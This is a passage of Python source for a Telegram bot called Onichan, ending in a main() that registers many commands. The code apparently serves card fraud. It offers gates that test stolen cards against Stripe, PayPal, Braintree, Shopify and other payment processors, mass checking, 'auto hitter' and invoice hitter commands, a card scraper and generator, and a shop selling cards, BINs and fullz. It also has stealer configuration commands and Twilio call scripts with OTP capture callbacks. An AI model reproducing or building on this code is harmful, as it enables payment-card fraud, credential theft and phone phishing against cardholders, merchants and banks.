                    chat_id=uid, photo=photo_url,
                    caption=caption, parse_mode=ParseMode.HTML)
            else:
                await context.bot.send_message(
                    chat_id=uid, text=text, parse_mode=ParseMode.HTML)
            success += 1
            await asyncio.sleep(0.05)
        except Exception as e:
            err = str(e).lower()
            if "blocked" in err or "deactivated" in err or "not found" in err:
                failed += 1
            else:
                try:
                    await asyncio.sleep(1)
                    if photo_url:
                        await context.bot.send_photo(
                            chat_id=uid, photo=photo_url,
                            caption=caption, parse_mode=ParseMode.HTML)
                    else:
                        await context.bot.send_message(
                            chat_id=uid, text=text, parse_mode=ParseMode.HTML)
                    success += 1
                except Exception:
                    failed += 1

    await status_msg.edit_text(
        f"📢 <b>Broadcast Complete</b>\n\n"
        f"✅ Sent: <b>{success}</b>\n"
        f"❌ Failed: <b>{failed}</b>\n"
        f"👥 Total: <b>{success + failed}</b>",
        parse_mode=ParseMode.HTML)


# ════════════════════════════════════════════════════════════════════════════
# SMART ADMIN ALERTS  /alertset  /myalerts
# ════════════════════════════════════════════════════════════════════════════

_alert_settings: dict = {}   # {user_id: {alert_type: value}}


async def alertset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/alertset TYPE VALUE — configure notification alerts."""
    user = update.effective_user
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return

    if len(context.args) < 2:
        await update.message.reply_text(
            "🔔 <b>Alert Settings</b>\n\n"
            "<b>Available alerts:</b>\n"
            "• <code>/alertset new_user on</code> — notify on new user join\n"
            "• <code>/alertset payment on</code> — notify on successful payment\n"
            "• <code>/alertset approved_threshold 10</code> — alert when user hits N approvals/session\n"
            "• <code>/alertset gate_fail_rate 80</code> — alert when gate decline rate > N%\n\n"
            "<b>Turn off:</b> <code>/alertset TYPE off</code>",
            parse_mode=ParseMode.HTML)
        return

    alert_type = context.args[0].lower()
    value      = context.args[1].lower()

    valid = {"new_user", "payment", "approved_threshold", "gate_fail_rate"}
    if alert_type not in valid:
        await update.message.reply_text(ae(f"❌ Unknown alert type. Use: {', '.join(valid)}"))
        return

    if user.id not in _alert_settings:
        _alert_settings[user.id] = {}

    if value == "off":
        _alert_settings[user.id].pop(alert_type, None)
        await update.message.reply_text(ae(f"🔕 Alert <b>{alert_type}</b> disabled."), parse_mode=ParseMode.HTML)
    else:
        _alert_settings[user.id][alert_type] = value
        await update.message.reply_text(
            ae(f"🔔 Alert <b>{alert_type}</b> set to <code>{value}</code>."),
            parse_mode=ParseMode.HTML)


async def myalerts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/myalerts — view active alert configurations."""
    user = update.effective_user
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return

    alerts = _alert_settings.get(user.id, {})
    if not alerts:
        await update.message.reply_text(
            ae("🔕 <b>No alerts configured.</b>\n\nUse /alertset to configure notifications."),
            parse_mode=ParseMode.HTML)
        return

    lines = [ae("🔔 <b>Your Active Alerts</b>\n")]
    for atype, val in alerts.items():
        lines.append(f"• <b>{atype}</b>: <code>{val}</code>")
    lines.append("\nUse <code>/alertset TYPE off</code> to disable any alert.")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def trigger_owner_alert(bot, alert_type: str, message: str):
    """Trigger an alert to all owners who have this alert type enabled."""
    from config import OWNER_ID
    # Check hardcoded owners + configured ones
    all_owners = list(_HARDCODED_OWNERS) + ([OWNER_ID] if OWNER_ID else [])
    for oid in set(all_owners):
        alerts = _alert_settings.get(oid, {})
        if alert_type in alerts and alerts[alert_type] != "off":
            try:
                await bot.send_message(
                    chat_id=oid,
                    text=f"🔔 <b>Alert: {alert_type}</b>\n\n{message}",
                    parse_mode="HTML")
            except Exception:
                pass


# ════════════════════════════════════════════════════════════════════════════
# PREMIUM ADVANCE EXPIRY NOTIFICATIONS  (24h / 6h / 1h warnings)
# ════════════════════════════════════════════════════════════════════════════

def _start_advance_expiry_notifier(bot_token: str):
    """Start background thread sending advance warnings before premium expires."""
    import threading, time as _t, requests as _req, json as _json
    from datetime import datetime, timedelta

    notified_cache: dict = {}  # {user_id: set_of_sent_intervals}

    def _loop():
        _t.sleep(60)
        while True:
            try:
                from modules.database import _execute_with_retry
                rows = _execute_with_retry("""
                    SELECT user_id, premium_expiry FROM users
                    WHERE premium = TRUE
                      AND premium_expiry IS NOT NULL
                      AND premium_expiry > NOW()
                      AND premium_expiry < NOW() + INTERVAL '25 hours'
                """, fetch=True) or []

                now = datetime.utcnow()
                for row in rows:
                    uid    = row["user_id"]
                    expiry = row["premium_expiry"]
                    if hasattr(expiry, "tzinfo") and expiry.tzinfo:
                        expiry = expiry.replace(tzinfo=None)
                    hours_left = (expiry - now).total_seconds() / 3600

                    if uid not in notified_cache:
                        notified_cache[uid] = set()

                    for threshold, label in [(24, "24h"), (6, "6h"), (1, "1h")]:
                        if hours_left <= threshold and label not in notified_cache[uid]:
                            notified_cache[uid].add(label)
                            msg = (
                                f"⏳ <b>Premium Expiring Soon!</b>\n\n"
                                f"Your Onichan Premium expires in ~{label}.\n\n"
                                f"Renew now to keep all gates, mass checks, and premium features.\n"
                                f"👉 /premium"
                            )
                            if label == "1h":
                                msg = (
                                    f"🚨 <b>FINAL HOUR!</b>\n\n"
                                    f"Your Premium expires in ~1 hour!\n"
                                    f"Renew immediately to avoid losing access.\n"
                                    f"👉 /premium"
                                )
                            try:
                                _req.post(
                                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
                                    json={"chat_id": uid, "text": msg, "parse_mode": "HTML"},
                                    timeout=10)
                            except Exception as e:
                                print(f"[AdvExpiry] Notify {uid} failed: {e}")

                # Clean up cache for users whose premium has expired
                alive = {row["user_id"] for row in rows}
                for uid in list(notified_cache.keys()):
                    if uid not in alive:
                        del notified_cache[uid]

            except Exception as e:
                print(f"[AdvExpiry] Loop error: {e}")
            _t.sleep(1800)  # check every 30 minutes

    t = threading.Thread(target=_loop, daemon=True)
    t.start()
    print("⏰ Advance premium expiry notifier started (30min interval)")


# ════════════════════════════════════════════════════════════════════════════
# TEXT MESSAGE ROUTER — dispatch awaiting states and live card paste
# ════════════════════════════════════════════════════════════════════════════

async def universal_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Route non-command text messages: bincheck, addbin details, card paste detection."""
    if not update.message or not update.message.text:
        return

    user = update.effective_user
    txt  = update.message.text.strip()

    # BIN check awaiting input
    if context.user_data.get("awaiting_bincheck"):
        context.user_data.pop("awaiting_bincheck", None)
        await _process_bincheck(update, context, txt)
        return

    # AddBin details awaiting input (admin)
    if context.user_data.get("awaiting_addbin_details") and is_owner(user.id):
        context.user_data.pop("awaiting_addbin_details", None)
        pending = context.user_data.pop("addbin_pending", {})
        lines = [l.strip() for l in txt.strip().splitlines() if l.strip()]
        if len(lines) < 6:
            await update.message.reply_text(ae("❌ Need at least 6 lines: brand, country, cc, type, level, bank, [sites...]"))
            return
        brand, country, cc, card_type, level, bank = lines[:6]
        sites = [{"name": f"Site {i+1}", "url": u, "description": "", "success_rate": 0}
                 for i, u in enumerate(lines[6:])]
        try:
            from modules.bin_shop import create_bin_listing
            loop = asyncio.get_running_loop()
            lid = await loop.run_in_executor(
                None, create_bin_listing,
                pending.get("bin"), brand, country, cc, card_type, level,
                bank, float(pending.get("price", 5)),
                sites, "", pending.get("desc", ""))
            await update.message.reply_text(
                ae(f"✅ BIN <code>{pending.get('bin')}</code> added to shop as listing #{lid}"),
                parse_mode=ParseMode.HTML)
        except Exception as e:
            await update.message.reply_text(ae(f"❌ Failed to add BIN: {str(e)[:100]}"))
        return

    # Live card paste detection (last resort)
    await live_card_paste_handler(update, context)


def main():
    """Start the bot"""
    print("=" * 80)
    print("🎀 ONICHAN BOT - Starting...")
    print("🎨 Hot Sexy Anime GIFs 4K Edition")
    print("=" * 80)

    import threading

    # ── Start Flask/keep_alive FIRST so the health-check probe always gets a
    #    200 response within ~1 second, regardless of how long other init takes.
    # SKIP_KEEP_ALIVE=1 is set by production_start.py, which already launched
    # the Flask server before starting bot.py as a subprocess.
    if REPLIT_MODE and not os.environ.get("SKIP_KEEP_ALIVE"):
        # Release the early health server on port 5000 so keep_alive (waitress)
        # can bind the same port for the full web panel.
        _port_for_ka = int(os.environ.get("PORT", 5000))
        _stop_early_health_srv(_port_for_ka)
        import time as _t; _t.sleep(0.3)  # give OS time to free the socket
        print("🌐 Starting keep_alive server for Replit...")
        keep_alive()
        print("✅ Keep_alive server started!")

        # Replit's Reserved-VM deployment health check probes port 5000
        # (the first [[ports]] entry in .replit), regardless of which port
        # the main Flask app uses.  Start a minimal mirror on 5000 so the
        # deployment probe always gets a 200.
        _main_port = int(os.environ.get("PORT", 8080))
        if _main_port != 5000:
            def _health_5000():
                try:
                    from flask import Flask as _F5
                    _a = _F5("h5k")
                    _a.route("/ping")(lambda: ("OK", 200))
                    _a.route("/")(lambda: ("OK", 200))
                    try:
                        from waitress import serve as _ws
                        _ws(_a, host="0.0.0.0", port=5000)
                    except Exception:
                        _a.run(host="0.0.0.0", port=5000)
                except Exception as _e:
                    print(f"[health5000] {_e}", flush=True)
            import threading as _th5
            _th5.Thread(target=_health_5000, daemon=True).start()
            print("✅ Health-check mirror started on :5000")

        # Start public tunnel so Twilio webhooks can reach us from the internet.
        # The riker.replit.dev dev domain resolves to 127.0.0.2 (Replit-internal
        # only), so Twilio's servers cannot reach it. localtunnel gives us a real
        # public HTTPS URL stored in /tmp/webhook_tunnel_url.
        try:
            import time as _t
            _t.sleep(1)  # give Flask a moment to bind
            from modules.twilio_call import start_tunnel
            _tunnel_url = start_tunnel(port=int(os.environ.get("PORT", 8080)))
            if _tunnel_url:
                print(f"🌍 Twilio webhook tunnel: {_tunnel_url}")
            else:
                print("⚠️ Tunnel not ready — Twilio voice calls may fail")
        except Exception as _te:
            print(f"⚠️ Tunnel start error: {_te}")

    deposit_thread = threading.Thread(target=_deposit_checker_loop, daemon=True)
    deposit_thread.start()
    print("💰 Deposit checker background thread started")

    # Warm the GIF cache in a background thread so it never blocks startup
    gif_cache_thread = threading.Thread(target=_preload_gif_cache, daemon=True)
    gif_cache_thread.start()

    try:
        from modules.proxy_scraper_engine import start_scraper_thread
        start_scraper_thread(interval_minutes=20)
        print("🕷️ Proxy scraper background thread started")
    except Exception as e:
        print(f"⚠️ Proxy scraper start failed: {e}")

    try:
        from modules.proxy_nodes import start_node_poller
        start_node_poller()
        print("📡 VPS node poller background thread started")
    except Exception as e:
        print(f"⚠️ Node poller start failed: {e}")

    try:
        from modules.proxy_shop import start_rotating_refresh_thread
        start_rotating_refresh_thread(interval_minutes=30)
        print("🔄 Rotating proxy auto-refresh thread started")
    except Exception as e:
        print(f"⚠️ Rotating refresh start failed: {e}")
    
    # Force delete webhook before starting (fix for conflict issues)
    import requests as req
    try:
        resp = req.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true")
        if resp.status_code == 200:
            print("🔄 Cleared webhook and pending updates")
    except:
        pass
    
    # Initialize Supabase (async)
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        supabase_result = loop.run_until_complete(init_supabase_async())
        if supabase_result:
            print("🗄️ Supabase: Connected")
        else:
            print("🗄️ Supabase: Not configured (using file storage)")
    except Exception as e:
        print(f"🗄️ Supabase: Error - {e}")
    
    # Ensure database files exist (fallback)
    ensure_database_files()

    # Initialize new module tables
    try:
        init_credits_tables()
        print("💰 Credits tables initialized")
    except Exception as _e:
        print(f"⚠️ Credits tables: {_e}")
    try:
        init_reseller_tables()
        print("👥 Reseller tables initialized")
    except Exception as _e:
        print(f"⚠️ Reseller tables: {_e}")
    try:
        init_escrow_tables()
        print("🤝 Escrow tables initialized")
    except Exception as _e:
        print(f"⚠️ Escrow tables: {_e}")
    try:
        init_monitor_tables()
        print("📊 Gate monitor tables initialized")
    except Exception as _e:
        print(f"⚠️ Gate monitor tables: {_e}")
    try:
        init_scraper_tables()
        print("📡 Scraper tables initialized")
    except Exception as _e:
        print(f"⚠️ Scraper tables: {_e}")
    try:
        init_hibp_tables()
        print("👁 HIBP tables initialized")
    except Exception as _e:
        print(f"⚠️ HIBP tables: {_e}")

    if OWNER_ID == 0:
        print("⚠️  WARNING: OWNER_ID not set in config.py!")
        print("   Get your ID from @userinfobot and update config.py")
    else:
        print(f"👑 Owner ID: {OWNER_ID}")
    
    print(f"🔒 Access Control: {'Enabled' if REQUIRE_APPROVAL else 'Disabled'}")
    print("=" * 80)
    
    # Create application with concurrent updates enabled for parallel user processing
    # Increase connection pool and timeouts for handling many simultaneous users
    from telegram.ext import Defaults
    from telegram.request import HTTPXRequest
    
    request = HTTPXRequest(
        connection_pool_size=100,  # Allow 100 concurrent connections
        read_timeout=30.0,
        write_timeout=30.0,
        connect_timeout=15.0,
        pool_timeout=30.0
    )
    
    async def _on_startup(app):
        import concurrent.futures
        loop = asyncio.get_running_loop()
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=50)
        loop.set_default_executor(executor)
        print("🔧 Thread pool set to 50 workers for concurrent card checking")
        from config import TON_WALLET
        await _ton_monitor.start_monitor(TON_WALLET, app.bot, set_premium_sync)

        # Boot the Pyrogram MTProto client for >50MB direct uploads (best-effort)
        try:
            if pyro_uploader.is_configured():
                client = await pyro_uploader.get_client()
                if client is None:
                    print("⚠️ Pyrogram client unavailable — large files will use file host links")
            else:
                print("ℹ️ TG_API_ID / TG_API_HASH not set — direct >50MB upload disabled (file host fallback active)")
        except Exception as _pe:
            print(f"⚠️ Pyrogram startup error: {_pe}")

    async def _on_shutdown(app):
        # Cleanly close the Pyrogram client so its session file isn't left mid-write
        try:
            await pyro_uploader.stop()
        except Exception:
            pass

    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)  # Handle multiple users simultaneously
        .request(request)
        .post_init(_on_startup)
        .post_shutdown(_on_shutdown)
        .build()
    )

    # ── Passive user/username upsert ──────────────────────────────────
    # Runs on EVERY incoming update (in its own group so it never blocks
    # the normal handler chain). Saves (user_id, username) to the `users`
    # table the first time anyone sends anything to the bot, so the
    # wallet's recipient lookup (@username / Telegram ID) can find them.
    from telegram.ext import TypeHandler

    async def _passive_user_upsert(update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            u = update.effective_user
            if not u or u.is_bot:
                return
            # Fire-and-forget — never crash the handler chain.
            try:
                add_user_sync(u.id, u.username, "pending")
            except Exception as _e:
                # Database may be momentarily unavailable; ignore.
                pass
        except Exception:
            pass

    # group=-1 so it runs before command handlers; block=False so concurrent
    # handlers in group 0 still fire normally.
    application.add_handler(
        TypeHandler(Update, _passive_user_upsert, block=False),
        group=-1,
    )

    # Add handlers
    # ── Custodial Wallet Commands ─────────────────────────────────────
    application.add_handler(CommandHandler("wallet", cmd_wallet))
    application.add_handler(CommandHandler("deposit", cmd_deposit))
    application.add_handler(CommandHandler("send", cmd_send))
    application.add_handler(CommandHandler("withdraw", cmd_withdraw))
    application.add_handler(CommandHandler("confirmwd", cmd_confirmwd))
    application.add_handler(CommandHandler("rejectwd", cmd_rejectwd))
    application.add_handler(CallbackQueryHandler(wallet_callback, pattern="^(wlt:|wdrej:|wdpick:)"))

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cmds", help_command))
    application.add_handler(CommandHandler("proxy", unified_proxy_command))
    application.add_handler(CommandHandler("scrapeproxy", proxy_scraper))
    application.add_handler(CommandHandler("freeproxy", proxy_scraper))
    application.add_handler(CommandHandler("ipcheck", ipcheck_command))
    application.add_handler(CommandHandler("gen", card_generator))
    application.add_handler(CommandHandler("bin", bin_lookup))
    application.add_handler(CommandHandler("fake", fake_address_generator))
    application.add_handler(CommandHandler("download", download_command))
    application.add_handler(CommandHandler("dl", download_command))
    application.add_handler(CommandHandler("dlpref", dlpref_command))
    application.add_handler(CommandHandler("tmail", tempmail_generate))
    application.add_handler(CommandHandler("tpno", temp_phone_command))
    application.add_handler(CommandHandler("ip", ip_check_command))
    application.add_handler(CommandHandler("ipscore", ip_check_command))
    application.add_handler(CommandHandler("sk", sk_check_command))
    application.add_handler(CommandHandler("skinfo", sk_check_command))
    application.add_handler(CommandHandler("exgate", gate_exgate))
    application.add_handler(CommandHandler("xgate", gate_exgate))
    application.add_handler(CommandHandler("ckproxy", proxy_check_command))
    application.add_handler(CommandHandler("proxycheck", proxy_check_command))
    application.add_handler(CommandHandler("proxymode", lambda u, c: _proxy_toggle_mode(u.message, u.effective_user.id, " ".join(c.args).strip() if c.args else "")))
    application.add_handler(CommandHandler("tempphone", temp_phone_command))
    application.add_handler(CommandHandler("ask", ask_command))
    application.add_handler(CommandHandler("ai", ask_command))
    application.add_handler(CommandHandler("gpt", ask_command))
    application.add_handler(CommandHandler("askill", askill_command))
    application.add_handler(CommandHandler("worm", askill_command))
    application.add_handler(CommandHandler("img", img_command))
    application.add_handler(CommandHandler("image", img_command))
    application.add_handler(CommandHandler("unimg", unimg_command))
    application.add_handler(CommandHandler("nsfw", unimg_command))
    application.add_handler(CommandHandler("music", music_command))
    application.add_handler(CommandHandler("suno", music_command))
    application.add_handler(CommandHandler("randi", randi_command))
    application.add_handler(CommandHandler("blackbox", randi_command))
    application.add_handler(CommandHandler("revrs", reverse_search_command))
    application.add_handler(CallbackQueryHandler(temp_phone_callback, pattern="^tpno_"))
    application.add_handler(CommandHandler("cmail", tempmail_check))
    application.add_handler(MessageHandler(filters.Regex(r'^/rmail_'), tempmail_read))
    application.add_handler(CommandHandler("web", web_analyzer_command))
    application.add_handler(CommandHandler("config", user_config_command))
    application.add_handler(CommandHandler("setmail", setmail_command))
    application.add_handler(CommandHandler("capkey", capkey_command))
    
    # CC Cleaner & Scraper handlers
    application.add_handler(CommandHandler("clean", clean_cc_file))
    application.add_handler(CommandHandler("filter", filter_cc_command))
    application.add_handler(CommandHandler("scr", cc_scraper))
    
    # Mass check handlers
    application.add_handler(CommandHandler("mass", mass_check))
    
    # Unified document handler (handles all TXT file scenarios)
    async def unified_document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle all TXT file uploads based on context"""
        # Check for mass check TXT shortcut
        if 'mass_check_gate' in context.user_data:
            await handle_mass_check_txt_file(update, context)
            return
        
        # Check for filter operation
        if 'cc_filter' in context.user_data:
            await handle_filter_file(update, context)
            return
        
        # Default: regular TXT file extraction
        await handle_txt_file(update, context)
    
    application.add_handler(MessageHandler(filters.Document.TXT, unified_document_handler))
    
    # Mass check shortcuts (mpp, mss, etc.)
    application.add_handler(CommandHandler("mpp", lambda u, c: mass_check_shortcut(u, c, "pp")))
    application.add_handler(CommandHandler("mss", lambda u, c: mass_check_shortcut(u, c, "ss")))
    application.add_handler(CommandHandler("mbu", lambda u, c: mass_check_shortcut(u, c, "bu")))
    application.add_handler(CommandHandler("msq", lambda u, c: mass_check_shortcut(u, c, "sq")))
    application.add_handler(CommandHandler("msor", lambda u, c: mass_check_shortcut(u, c, "sor")))
    application.add_handler(CommandHandler("mstr", mass_str))
    application.add_handler(CommandHandler("mstm", lambda u, c: mass_check_shortcut(u, c, "stm")))
    
    # Mass check TXT file shortcuts - Free gates
    application.add_handler(CommandHandler("msstxt", lambda u, c: mass_check_txt_shortcut(u, c, "ss")))
    application.add_handler(CommandHandler("mbutxt", lambda u, c: mass_check_txt_shortcut(u, c, "bu")))
    application.add_handler(CommandHandler("msqtxt", lambda u, c: mass_check_txt_shortcut(u, c, "sq")))
    
    # Mass check TXT file shortcuts - Premium gates
    application.add_handler(CommandHandler("mpptxt", lambda u, c: mass_check_txt_shortcut(u, c, "pp")))
    application.add_handler(CommandHandler("msortxt", lambda u, c: mass_check_txt_shortcut(u, c, "sor")))
    application.add_handler(CommandHandler("mst5txt", lambda u, c: mass_check_txt_shortcut(u, c, "st5")))
    application.add_handler(CommandHandler("mst12txt", lambda u, c: mass_check_txt_shortcut(u, c, "st12")))
    application.add_handler(CommandHandler("mstrtxt", lambda u, c: mass_check_txt_shortcut(u, c, "str")))
    application.add_handler(CommandHandler("mdeptxt", lambda u, c: mass_check_txt_shortcut(u, c, "dep")))
    application.add_handler(CommandHandler("mauztxt", lambda u, c: mass_check_txt_shortcut(u, c, "auz")))
    application.add_handler(CommandHandler("masdtxt", lambda u, c: mass_check_txt_shortcut(u, c, "asd")))
    application.add_handler(CommandHandler("matftxt", lambda u, c: mass_check_txt_shortcut(u, c, "atf")))
    application.add_handler(CommandHandler("manhtxt", lambda u, c: mass_check_txt_shortcut(u, c, "anh")))
    application.add_handler(CommandHandler("msh6txt", lambda u, c: mass_check_txt_shortcut(u, c, "sh6")))
    application.add_handler(CommandHandler("msh8txt", lambda u, c: mass_check_txt_shortcut(u, c, "sh8")))
    application.add_handler(CommandHandler("msh10txt", lambda u, c: mass_check_txt_shortcut(u, c, "sh10")))
    application.add_handler(CommandHandler("msh13txt", lambda u, c: mass_check_txt_shortcut(u, c, "sh13")))
    application.add_handler(CommandHandler("mbt1txt", lambda u, c: mass_check_txt_shortcut(u, c, "bt1")))
    application.add_handler(CommandHandler("mbt3dtxt", lambda u, c: mass_check_txt_shortcut(u, c, "bt3d")))
    application.add_handler(CommandHandler("mstmtxt", lambda u, c: mass_check_txt_shortcut(u, c, "stm")))
    
    # Dot prefix handlers (.pp, .ss, etc.)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_dot_commands))
    
    # Gate handlers - Free
    application.add_handler(CommandHandler("sq", gate_sq))
    application.add_handler(CommandHandler("bu", gate_bu))
    
    # Gate handlers - Premium PayPal
    application.add_handler(CommandHandler("pp", gate_pp))
    application.add_handler(CommandHandler("ppv", gate_ppv))
    
    # Gate handlers - Premium Stripe
    application.add_handler(CommandHandler("sor", gate_sor))
    application.add_handler(CommandHandler("st5", gate_st5))
    application.add_handler(CommandHandler("st12", gate_st12))
    application.add_handler(CommandHandler("str", gate_str))
    application.add_handler(CommandHandler("b3n", gate_b3n))
    application.add_handler(CommandHandler("dep", gate_dep))

    # Website Auto-Hit (WAH) handler
    application.add_handler(CommandHandler("wah", gate_wah))
    
    # Gate handlers - Premium Authorize.net
    application.add_handler(CommandHandler("auz", gate_auz))
    application.add_handler(CommandHandler("asd", gate_asd))
    application.add_handler(CommandHandler("atf", gate_atf))
    application.add_handler(CommandHandler("anh", gate_anh))
    
    # Gate handlers - Premium Shopify
    application.add_handler(CommandHandler("sh6", gate_sh6))
    application.add_handler(CommandHandler("sh8", gate_sh8))
    application.add_handler(CommandHandler("sh10", gate_sh10))
    application.add_handler(CommandHandler("sh13", gate_sh13))
    
    # Gate handlers - Braintree (External API)
    application.add_handler(CommandHandler("b3", gate_b3))
    application.add_handler(CommandHandler("mb3", mass_b3))
    
    # Gate handlers - Premium Braintree
    application.add_handler(CommandHandler("bt1", gate_bt1))
    application.add_handler(CommandHandler("bt3d", gate_bt3d))
    
    # Gate handlers - Auto Stripe Auth (newrp.vercel.app)
    application.add_handler(CommandHandler("ast", gate_ast))
    application.add_handler(CommandHandler("mast", mass_ast))
    
    # Gate handlers - Stripe NewRP Auth
    application.add_handler(CommandHandler("st", gate_st))
    application.add_handler(CommandHandler("mst", mass_st))
    application.add_handler(CommandHandler("msttxt", lambda u, c: mass_check_txt_shortcut(u, c, "st")))
    
    # Gate handlers - Razorpay (BarryX API)
    application.add_handler(CommandHandler("rz", gate_rz))
    application.add_handler(CommandHandler("mrz", gate_mrz))
    
    # Gate handlers - Razorpay Pages (External API)
    application.add_handler(CommandHandler("rzp", gate_rzp))
    application.add_handler(CommandHandler("mrzp", gate_mrzp))
    
    # Gate handlers - PayU ₹1
    application.add_handler(CommandHandler("payu", gate_payu))
    application.add_handler(CommandHandler("mpayu", gate_mpayu))
    
    application.add_handler(CommandHandler("kill", gate_kill))
    # Register Stripe Invoice Hitter
    application.add_handler(CommandHandler("inv", stripe_invoice_hitter))
    # Register Epoch Hitter
    application.add_handler(CommandHandler("cam", epoch_hitter))
    # Only auto-trigger invoice hitter on invoice.stripe.com URLs (not checkout URLs)
    application.add_handler(MessageHandler(filters.Regex(r'(https?://invoice\.stripe\.com/\S+)'), stripe_invoice_hitter))
    
    # Stop mass check command
    application.add_handler(CommandHandler("stop", stop_mass_check))
    
    # Gate handlers - Premium Stripe Mass Auth
    application.add_handler(CommandHandler("stm", gate_stm))
    
    # Gate handlers - Premium Stripe €1
    application.add_handler(CommandHandler("se1", gate_se1))
    
    # Gate handlers - Premium Shopify Auto
    application.add_handler(CommandHandler("sh", gate_sh))
    application.add_handler(CommandHandler("msh", mass_sh))
    application.add_handler(CommandHandler("mshtxt", lambda u, c: mass_check_txt_shortcut(u, c, "sh")))
    
    # Auto Hitter handlers
    application.add_handler(CommandHandler("co", auto_hitter_command))
    application.add_handler(CommandHandler("hit", auto_hitter_command))
    application.add_handler(CommandHandler("bulkhit", bulkhit_command))
    application.add_handler(CommandHandler("coinfo", coinfo_command))
    application.add_handler(CommandHandler("cocheck", cocheck_command))
    application.add_handler(CommandHandler("mco", mco_command))
    # Saved BIN commands
    application.add_handler(CommandHandler("savebin", savebin_command))
    application.add_handler(CommandHandler("mybins", mybins_command))
    application.add_handler(CommandHandler("deletebin", deletebin_command))
    
    # Proxy Management handlers
    application.add_handler(CommandHandler("addproxy", addproxy_command))
    application.add_handler(CommandHandler("removeproxy", removeproxy_command))
    application.add_handler(CommandHandler("myproxy", myproxy_command))
    application.add_handler(CommandHandler("checkproxy", checkproxy_command))
    
    # Email Management handlers
    application.add_handler(CommandHandler("setemail", setemail_command))
    application.add_handler(CommandHandler("myemail", myemail_command))
    
    # Stripe $1 Gate handler
    application.add_handler(CommandHandler("st1", gate_st1))
    application.add_handler(CommandHandler("mst1", lambda u, c: mass_check_shortcut(u, c, "st1")))
    application.add_handler(CommandHandler("mst1txt", lambda u, c: mass_check_txt_shortcut(u, c, "st1")))
    
    # Admin handlers
    application.add_handler(CommandHandler("ping", ping_command))
    application.add_handler(CommandHandler("approve", approve_user))
    application.add_handler(CommandHandler("rspfakeon", rspfakeon))
    application.add_handler(CommandHandler("rspfakeoff", rspfakeoff))
    application.add_handler(CommandHandler("premium", give_premium))
    application.add_handler(CommandHandler("rmpremium", remove_premium))
    application.add_handler(CommandHandler("info", user_info))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("unban", unban_user))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("stats", bot_stats))
    application.add_handler(CommandHandler("pending", pending_users))
    application.add_handler(CommandHandler("addadmin", add_admin))
    application.add_handler(CommandHandler("removeadmin", remove_admin))
    application.add_handler(CommandHandler("admins", list_admins))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("setstealer", set_stealer))
    application.add_handler(CommandHandler("teststealer", test_stealer))
    application.add_handler(CommandHandler("getid", get_chat_id))
    
    # Proxy Shop handler
    application.add_handler(CommandHandler("proxyshop", proxyshop_command))
    application.add_handler(CommandHandler("proxies", myproxies_command))
    application.add_handler(CommandHandler("myproxies", myproxies_command))

    # CC Shop handlers
    application.add_handler(CommandHandler("shop", shop_command))
    application.add_handler(CommandHandler("checkout", checkout_command))
    application.add_handler(CommandHandler("call", call_command))
    application.add_handler(CommandHandler("setscript", setscript_command))
    application.add_handler(CommandHandler("myscript", myscript_command))
    application.add_handler(CommandHandler("clearscript", clearscript_command))
    application.add_handler(CallbackQueryHandler(call_lang_callback, pattern="^calllang_"))
    application.add_handler(CallbackQueryHandler(otp_action_callback, pattern="^otp_(accept|decline)_"))
    application.add_handler(CommandHandler("shopbuy", shopbuy_command))
    application.add_handler(CommandHandler("buy", shopbuy_command))
    application.add_handler(CommandHandler("balance", balance_command))
    application.add_handler(CommandHandler("addbalance", addbalance_command))
    application.add_handler(CommandHandler("mypurchases", mypurchases_command))
    application.add_handler(CommandHandler("purchased", mypurchases_command))

    # Premium Key handlers
    application.add_handler(CommandHandler("genkey", generate_premium_key))
    application.add_handler(CommandHandler("redeem", redeem_premium_key))
    application.add_handler(CommandHandler("keys", list_keys))
    application.add_handler(CommandHandler("burn", burn_keys_command))
    
    # Crypto Payment handlers
    application.add_handler(CommandHandler("crypto", buy_crypto))
    application.add_handler(CommandHandler("mypayments", my_payments))
    application.add_handler(CommandHandler("checkpayment", check_payment))
    application.add_handler(CommandHandler("cryptoactivate", admin_activate_crypto))
    
    # Telegram Stars Payment handlers
    application.add_handler(PreCheckoutQueryHandler(handle_pre_checkout))
    application.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, handle_successful_payment))

    # TON payment — receive transaction hash from user
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ton_txhash), group=1)
    
    # Secret & Premium handlers
    application.add_handler(CommandHandler("secretapproved", secret_approved))
    application.add_handler(CommandHandler("revenue", revenue_stats))
    application.add_handler(CommandHandler("plans", show_plans))
    
    application.add_handler(CallbackQueryHandler(hit_callback_handler, pattern="^(hit(all|first|close|stop)|sbin)_|^hit_(home|hitcards|generator|myhits|status|ranking|savedbins|plans|settings|toggle_proxy|toggle_site)$"))
    application.add_handler(CallbackQueryHandler(save_proxy_callback, pattern="^saveproxy_"))
    application.add_handler(CallbackQueryHandler(discard_proxy_callback, pattern="^discardproxy_"))
    application.add_handler(CallbackQueryHandler(regenerate_cards_callback, pattern="^regen"))
    application.add_handler(CallbackQueryHandler(download_quality_callback, pattern="^dlq_"))
    application.add_handler(CallbackQueryHandler(download_delivery_callback, pattern="^dldel_"))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    application.add_handler(CommandHandler("address", cmd_address))
    application.add_handler(CommandHandler("fullz", cmd_fullz))
    application.add_handler(CommandHandler("credits", cmd_balance))
    application.add_handler(CommandHandler("mybalance", cmd_balance))
